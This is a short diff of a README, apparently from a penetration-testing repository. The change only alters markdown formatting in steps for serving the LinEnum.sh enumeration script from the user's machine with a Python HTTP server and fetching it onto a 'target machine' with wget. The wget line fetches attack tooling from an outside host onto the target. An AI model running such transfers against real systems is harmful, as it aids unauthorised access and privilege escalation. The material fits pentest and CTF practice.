@@ -71,7 +71,7 @@ where :
   
  - Download the executable from this repo, go the the directory where it's located and type ```python3 -m http.server 1234```
  - Open a terminal on your computer and type ```ifconfig```, find your ip adress.
- - On your target machine, type ```wget http://**YourIP**:1234/LinEnum.sh```
+ - On your target machine, type ```wget http://YourIP:1234/LinEnum.sh```
 
 that's it ! you should have LinEnum on the target machine ;)
           
